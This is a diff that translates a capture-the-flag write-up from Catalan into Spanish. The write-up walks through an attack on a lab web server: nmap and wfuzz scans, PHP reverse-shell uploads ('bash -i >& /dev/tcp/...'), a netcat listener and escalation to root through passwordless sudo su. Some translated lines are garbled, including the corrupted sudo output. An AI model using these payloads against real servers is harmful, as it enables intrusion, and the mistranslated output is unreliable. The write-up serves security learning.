@@ -4,60 +4,59 @@
 - **Domini**: [hackmeifyoucan.com](http://hackmeifyoucan.com/)
 - **IP**: `212.227.146.196`
 
-## Afegir host
-Primer de tot, afegim el domini al fitxer de hosts, localitzat a la ruta `/etc/hosts`.
+## Añadir host
+Ante todo, añadimos el dominio al archivo de hosts, localizado en la ruta `/etc/hosts`.
 
 ```
 212.227.146.196 hackmeifyoucan.com
 ```
 
-Un cop fet això, podem visualitzar la web al navegador.
+Una vez hecho esto, podemos visualizar la web en el navegador.
 
-## Descripció de la web
-Es tracta d'una web amb un disseny simple però ben trobat, on podem escoltar una cançó ben xula i penjar un fitxer.
+## Descripción de la web
+Se trata de una web con un diseño simple pero bien encontrado, donde podemos escuchar una canción bien chula y colgar un archivo.
 ![website](./img/website.png)
 
 Bueno, o no xD
 
-![or not :/](./img/or_not.png)
+![oro not :/](./img/or_not.png)
 
-A simple vista, la web té quatre pàgines principals:
-- **Home** (`/index.php`): pàgina d'inici on es pot escoltar una cançó i ser *trol·lejat* pensant que pots penjar un fitxer.
-- **Upload** (`/upload.php`): pàgina on realment pots penjar un fitxer.
-- **Folder** (`/uploads/`): llistat de fitxers pujats. N'hi ha dos:
-    - `LogicaProposicions.pdf`: PDF molt avorrit on pots aprendre lògica de proposicions (bombardeen UdG).
-    - `parthenoun_shell.php`: arxiu PHP que te pinta a bomba nuclear. Està protegit sota una contrassenya.
-- **Login** (`/login.php`): pàgina per logginar-se. Hi ha dos usuaris disponibles amb les seves respectives contrassenyes: **Admin** i **pepe**.
+A simple vista, la web tiene cuatro páginas principales:
+- **Home** (`/index.php`): página de inicio donde se puede escuchar una canción y ser *troleado* pensando que puedes colgar un archivo.
+- **Upload** (`/upload.php`): página donde realmente puedes colgar un archivo.
+- **Folder** (`/uploads/`): listado de archivos subidos. Hay dos:
+     - `LogicaProposicions.pdf`: PDF muy aburrido donde puedes aprender lógica de proposiciones (bombardeen UdG).
+     - `parthenoun_shell.php`: archivo PHP que te pinta a bomba nuclear. Está protegido bajo una contraseña.
+- **Login** (`/login.php`): página para logginarse. Hay dos usuarios disponibles con sus respectivas contraseñas: **Admin** y **pepe**.
 
-## Reconeixement
-Primer de tot, comprovarem quin és el sistema del servidor executant un `ping`. Si el `ttl` s'aproxima a 64 significa que estem davant d'una màquina **Linux**, en canvi si s'aproxima a 128, d'una màquina **Windows**.
+## Reconocimiento
+Ante todo, comprobaremos cuál es el sistema del servidor ejecutando un `ping`. Si el `ttl` se aproxima a 64 significa que estamos delante de una máquina **Linux**, en cambio si se aproxima a 128, de una máquina **Windows**.
 
-```
+````
 $ ping -c 1 212.227.146.196
-```
+````
 
-Hem detectat que és una màquina Linux.
+Se ha detectado que es una máquina Linux.
 
 ### Scan Nmap
-Tot seguit procedim amb un scan d'**Nmap**. La comanda usada ha estat la següent:
+A continuación procedemos con un scan de **Nmap**. El pedido usado ha sido el siguiente:
 
 ```
 $ nmap -p- --open -sS --min-rate 5000 -vvv -n 212.227.146.196 -oG allPorts
 ```
 
-Gràcies a això descobrim que hi ha **3 ports oberts**. Aquests són:
+Gracias a esto descubrimos que existen **3 puertos abiertos**. Estos son:
 - `22/tcp` (ssh)
 - `53/tcp` (domain)
 - `80/tcp` (http)
 
-Un cop sabem els ports oberts, realitzarem un reconeixament més concret a aquests ports que hem descobert. Ignorarem el `53` ja que és tan sols per al domini.
+Una vez que sabemos los puertos abiertos, realizaremos un reconocimiento más concreto a estos puertos que hemos descubierto. Ignoraremos el `53` ya que es sólo para el dominio.
 
 ```
 $ nmap -p22,80 212.227.146.196 -sCV -oN targeted
 ```
 
-La resposta obtinguda ha estat la següent:
-
+La respuesta obtenida ha sido la siguiente:
 ```
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
@@ -71,29 +70,28 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-Així doncs, tenim un servidor d'**OpenSSH 8.2p1** al port `22` i un servidor HTTP d'**Apache 2.4.41** al port `80`. També hem descobert la distro de Linux utilitzada, **Ubuntu**.
+Así pues, tenemos un servidor de OpenSSH 8.2p1** en el puerto `22` y un servidor HTTP de Apache 2.4.41** en el puerto `80`. También hemos descubierto la distro de Linux utilizada, **Ubuntu**.
 
-## Escaneig de directoris
-Com hem comentat anteriorment, a la web s'hi poden observar 4 pàgines, però podria ser que n'hi hagués més d'amagades que revel·lessin informació.
+## Escaneo de directorios
+Como hemos comentado anteriormente, en la web se pueden observar 4 páginas, pero podría haber más escondidas que revelaran información.
 
-Usarem l'eina **WFuzz** per a escanejar els directoris de la web. Emprarem la *wordlist* `directory-list-lowercase-2.3-medium.txt` de **DirBuster**, i li direm que amagui les peticions que retornin un codi **404** amb la opció `--hc 404`.
+Usaremos la herramienta **WFuzz** para escanear los directorios de la web. Emplearemos la *wordlist* `directory-list-lowercase-2.3-medium.txt` de **DirBuster**, y le diremos que esconda las peticiones que devuelvan un código **404** con la opción `--hc 404` .
 
 ```
 $ wfuzz --hc 404 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt http://hackmeifyoucan.com/FUZZ
 ```
 
-Gràcies a això, hem descobert el directori `/javascript/`, però no ens hi deixa accedir per falta de privilegis.
+Gracias a ello, hemos descubierto el directorio `/javascript/` pero no nos deja acceder por falta de privilegios.
 
 ![/javascript/ Forbidden](./img/javascript_forbidden.png)
 
-## Escaneig d'arxius PHP
-Com hem pogut observar, la pàgina web està feta amb PHP. Se m'ha acudit fer un escaneig d'arxius amb l'extensió `.php`. Usarem un *wordlist* que he tret de **GitHub**, anomenat [Common-PHP-Filenames.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/Common-PHP-Filenames.txt).
-
+## Escaneo de archivos PHP
+Como hemos observado, la página web está hecha con PHP. Se me ha ocurrido hacer un escaneo de archivos con la extensión `.php`. Usaremos un *wordlist* que he sacado de **GitHub**, llamado [Common-PHP-Filenames.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/Common-PHP-Filenames.txt).
 ```
 $ wfuzz --hc 404 -w Common-PHP-Filenames.txt http://hackmeifyoucan.com/FUZZ
 ```
 
-Ràpidament hem trobat els arxius que ja coneixiem, i un de nou, `logout.php`.
+Rápidamente hemos encontrado los archivos que ya conocíamos, y uno nuevo, `logout.php`.
 
 ```
 Target: http://hackmeifyoucan.com/FUZZ
@@ -109,140 +107,140 @@ ID           Response   Lines    Word       Chars       Payload
 000000172:   302        11 L     47 W       480 Ch      "logout.php"
 ```
 
-Segurament deu ser el que es crida en tancar sessió, però tampoc hi tenim accés (de moment >:D).
+Seguramente será el que se llama al cierre de sesión, pero tampoco tenemos acceso (de momento >:D).
 
-## Explotació d'`upload.php`
-De moment els escanejos d'arxius han estat bastant inútils, però tampoc han estat de més. Anem a pel que crec q hauriem d'haver començat: **explotar el sistema de pujada de fitxers**.
+## Explotación de `upload.php`
+Por el momento los escaneos de archivos han sido bastante inútiles, pero tampoco han sido de más. Vamos a por lo que creo q deberíamos haber empezado: **explotar el sistema de subida de archivos**.
 
-Quan pengem un fitxer, aquest és llegit pel sistema i el penja a la ruta `/uploads/ARXIU`.
+Cuando colgamos un archivo, éste es leído por el sistema y lo cuelga en la ruta `/uploads/ARCHIVO`.
 
-Què passaria si li pengem un arxiu amb codi PHP? Intentem-ho.
+¿Qué pasaría si le colgamos un archivo con código PHP? Intentémoslo.
 
 **echo.php**:
 ```php
 <?php echo "XAAAAATOOOOO"; ?>
 ```
 
-Sembla que ha funcionat. Ens deixa executar el fitxer.
+Parece que ha funcionado. Nos deja ejecutar el archivo.
 
 ![echo.php](./img/echo.png)
 
-Però i si en comptes de fer que escrigui un text a la pàgina, li enxufem un comando que es connecti a la nostra màquina? *(Reverse Shell)*
+Pero ¿y si en vez de hacer que escriba un texto en la página, le enchufamos un comando que se conecte a nuestra máquina? *(Reverse Shell)*
 
-Per a generar la comanda, faré us de la pàgina [revshells.com](https://www.revshells.com/). No oblidem seleccionar el tema "Meme".
+Para generar el pedido, haré uso de la página [revshells.com](https://www.revshells.com/). No olvidemos seleccionar el tema "Meme".
 
 ![revshells.com](./img/revshells.png)
 
-Un cop tenim la comanda per a la víctima i l'atacant, creem l'arxiu PHP.
+Una vez tenemos el pedido para la víctima y el atacante, creamos el archivo PHP.
 
 **shell.php**:
 ```php
 <?php exec("bash -i >& /dev/tcp/212.227.146.196/4646 0>&1") ?>
 ```
 
-Prèviament a penjar l'arxiu, ens posem en escolta al port `4646` amb **Netcat**.
+Previamente a colgar el archivo, nos ponemos en escucha en el puerto `4646` con **Netcat**.
 
 ```
 $ nc -lvnp 4646
 ```
 
-Un cop pengem l'arxiu i l'obrim, no passa absolutament res perquè no he especificat la IP de l'atacant (la meva), sinó la de la víctima, per tant s'està intentant connectar a sí mateix (sóc burro).
+Una vez colgamos el archivo y lo abrimos, no pasa absolutamente nada porque no he especificado la IP del atacante (la mía), sino la de la víctima, por tanto se está intentando conectar a sí mismo (soy burro) .
 
-Ara sí, ho fotrem bé.
+Ahora sí, lo jodaremos bien.
 
 **shell.php**:
 ```php
 <?php exec("bash -i >& /dev/tcp/IP_DEL_FONTA/4646 0>&1") ?>
 ```
 
-Doncs mecagum deu no va. *xd*.
+Pues mecagum diez no va. *xd*.
 
-### Intent de port forwarding
-Fent una mica de recerca, al tenir la IP dinàmica no funciona. Haurem de fer port forwarding amb **Ngrok**.
+### Intento de puerto forwarding
+Haciendo algo de investigación, al tener la IP dinámica no funciona. Deberemos hacer puerto forwarding con **Ngrok**.
 
-Primer de tot, obrim un **túnel TCP** al port desitjat, en aquest cas, el `4646`.
+Ante todo, abrimos un **túnel TCP** en el puerto deseado, en este caso, el `4646`.
 
 ```
 $ ngrok tcp 4646
 ```
 
-D'aquesta manera, obtenim una url que redirigeix al nostre port local.
+De esta forma, obtenemos una url que redirige a nuestro puerto local.
 
 ```
 tcp://X.tcp.eu.ngrok.io:XXXXX -> localhost:4646
 ```
 
-Així doncs, podem actualitzar el nostre *payload*, aviam si va aquest cop.
+Así pues, podemos actualizar nuestro payload*, a ver si va esta vez.
 
 **shell_ngrok.php**:
 ```php
 <?php exec("bash -i >& /dev/tcp/X.tcp.eu.ngrok.io:XXXXX 0>&1") ?>
 ```
 
-*TAMPOC VA.*
+*TAMPOCO VA.*
 
-Provem una altra sintaxi.
+Probamos otra sintaxis.
 
 **shell_ngrok.php**:
 ```php
 <?php exec("bash -c 'bash -i >& /dev/tcp/X.tcp.eu.ngrok.io:XXXXX 0>&1'") ?>
 ```
 
-Doncs tampoc.
+Pues tampoco.
 
-### Shell ja feta de Kali Linux
-Després dels meus nefastos intents, recercant he trobat que **Kali Linux** ja inclou una sèrie de scripts de reverse shell per a PHP. Anem a intentar-ho.
+### Shell ya hecha de Kali Linux
+Después de mis nefastos intentos, buscando he encontrado que **Kali Linux** ya incluye una serie de scripts de reverse shell para PHP. Vamos a intentarlo.
 
 **Ruta**: `/usr/share/webshells/php/php-reverse-shell.php`
 
-Finalment després d'editar el fitxer amb la IP i el port desitjat, hem aconseguit una connexió!
+Finalmente después de editar el archivo con la IP y el puerto deseado, hemos conseguido una conexión!
 
 ![Successful Revshell](./img/success_revshell.png)
 
-## Exploració del servidor
-En el servidor, a part d'una wordlist immensa al directori `/home/armando` (molt graciós Jordi, m'ha fet perdre la connexió), no hi he trobat res gaire rellevant, a part d'un fitxer `.ovpn`, que correspon a **OpenVPN**. Això vol dir que si l'executem, podem establir una connexió VPN a un servidor.
+## Exploración del servidor
+En el servidor, aparte de una wordlist inmensa en el directorio `/home/armando` (muy gracioso Jordi, me ha hecho perder la conexión), no he encontrado nada muy relevante, aparte de un archivo `.ovpn `, que corresponde a **OpenVPN**. Esto significa que si lo ejecutamos, podemos establecer una conexión VPN a un servidor.
 
-Si llegim l'arxiu, el servidor és `bluegraded.i234.me`, i el port `1194`.
+Si leemos el archivo, el servidor es `bluegraded.i234.me`, y el puerto `1194`.
 
-M'he descarregat l'arxiu i l'he executat, però ens demana autenticar-nos. De moment no en tenim les credencials.
+Me he descargado el archivo y lo he ejecutado, pero nos pide autenticarnos. Por el momento no tenemos las credenciales.
 
-D'altra banda, si naveguem a l'URL del servidor, trobem una pàgina web amb un formulari d'autenticació, també de PHP.
+Por otra parte, si navegamos en la URL del servidor, encontramos una página web con un formulario de autenticación, también de PHP.
 
 ![bluegraded.i234.me web interface](./img/bluegraded.png)
 
-A partir d'aquest punt ja no sé si això és una cosa externa o té algo a veure amb la web. Decideixo moure'm a l'inici altre cop.
+A partir de este punto ya no sé si esto es algo externo o tiene algo que ver con la web. Decido moverme al inicio de nuevo.
 
-> **EDIT**: m'han confirmat que aquell arxiu no havia d'estar allà, osigui que menos mal que no hem fet res XD
+> **EDIT**: me han confirmado que aquel archivo no debía estar allí, o sea que menos mal que no hemos hecho nada XD
 
 ## `whoami`: `root`
-En una nova instància de shell, comprovo els privilegis de `sudo` de l'usuari actual. Ves per on, té pebrots la cosa:
+En una nueva instancia de shell, compruebo los privilegios de `sudo` del usuario actual. Mira por dónde, tiene pimientos la cosa:
 
 ```
 $ sudo -l
-Matching Defaults entries for www-data on localhost:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+Matching Defaults entres para www-fecha donde localhost:
+env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-User www-data may run the following commands on localhost:
-    (ALL) NOPASSWD: /usr/bin/su
+User www-feature may run the following commands on localhost:
+(ALL) NOPASSWD: /usr/bin/su
 ```
 
-Sense pensar-m'ho dues vegades executo la comanda `su` i aconsegueixo escalar privilegis de manera bastant èpica.
+Sin pensármelo dos veces ejecuto el pedido `su` y consigo escalar privilegios de manera bastante épica.
 
 ![whoami root](./img/revshell_root.png)
 
-Dins el directori `/root` finalment trobem l'arxiu `flag.txt` que conté la flag!
+¡En el directorio `/root` finalmente encontramos el archivo `flag.txt` que contiene la flag!
 
 ![flag!!](./img/flag_root.png)
 
 ## Website fail
-Inspeccionant la web, he entrat al directori `/var/www/html/hackmeifyoucan`. Aquest directori conté el codi font de la web, el qual podem interpretar i obtenir informació molt valuosa. A més, hi ha una altra flag!
+Inspeccionando la web, he entrado en el directorio `/var/www/html/hackmeifyoucan`. Este directorio contiene el código fuente de la web, que podemos interpretar y obtener información muy valiosa. Además, ¡hay otra flag!
 
 ![flag www](./img/flag_www.png)
 
-Realment aquesta era la primera que haviem d'aconseguir, ja que no requeriem de privilegis per a trobar-la, però bé, jo ja tenia la de `root` guardada.
+Realmente ésta era la primera que teníamos que conseguir, ya que no requeríamos de privilegios para encontrarla, pero bueno, yo ya tenía la de `root` guardada.
 
 ## Target: `armando`
-Dins de la carpeta `/var/www/html` trobo un arxiu que em crida l'atenció: `credentials_ssh.md`.
+Dentro de la carpeta `/var/www/html` encuentro un archivo que me llama la atención: `credentials_ssh.md`.
 
 ```md
 **TODO: Reforzar la seguridad de la contraseña de "armando"**
@@ -257,21 +255,21 @@ seguridad de la contraseña de "armando" para que pueda
 resistir cualquier intento de acceso no autorizado.
 ```
 
-D'entrada ens està donant un usuari d'`SSH`: **armando**. Alhora ens don pistes sobre la contrassenya, i ens confirma que no és gaire segura.
+De entrada nos está dando un usuario de `SSH`: **armando**. Al mismo tiempo nos dan pistas sobre la contraseña, y nos confirma que no es muy segura.
 
-Dins `/home/armando` trobem una wordlist, com hem dit abans. Es tracta de `rockyou.txt`, la més famosa a l'hora de crackejar contrassenyes. Se m'acut realitzar un atac de força bruta emprant aquest fitxer.
+Dentro de `/home/armando` encontramos una wordlist, como hemos dicho antes. Se trata de `rockyou.txt`, la más famosa a la hora de crackear contraseñas. Se me ocurre realizar un ataque de fuerza bruta empleando este archivo.
 
 ## Flag final
-Finalment, abans de petar el servidor amb força bruta, m'he percatat gràcies a la comanda `ls -a` que dins de `/home/armando` hi havia la última flag, tot i que estava oculta.
+Finalmente, antes de charlar el servidor con fuerza bruta, me he percatado gracias al comando `ls -a` que dentro de `/home/armando` había la última flag, aunque estaba oculta.
 
 ![flag armando](./img/flag_armando.png)
 
-Ja tenim les 3 flags! No les hem aconseguit per ordre, però hi són totes!
+¡Ya tenemos las 3 flags! No las hemos conseguido por orden, ¡pero están todas!
 
-## Conclusions
-Al final, després de molts errors i liades, hem aconseguit les flags, no per ordre, però totes 3!
+## Conclusiones
+Al final, después de muchos errores y liadas, hemos conseguido las flags, no por orden, ¡pero las 3!
 
-El lab és molt complert i el recomano molt a gent que estigui començant com jo, ja que permet practicar *XSS* i *reverse shells*, alhora d'aprendre a escalar privilegis en un entorn Linux.
+El lab es muy completo y lo recomiendo mucho a gente que esté empezando como yo, ya que permite practicar *XSS* y *reverse shells*, a la vez que aprender a escalar privilegios en un entorno Linux.
 
 ```
   █████▒▒█████   ███▄    █ ▄▄▄█████▓ ▄▄▄      
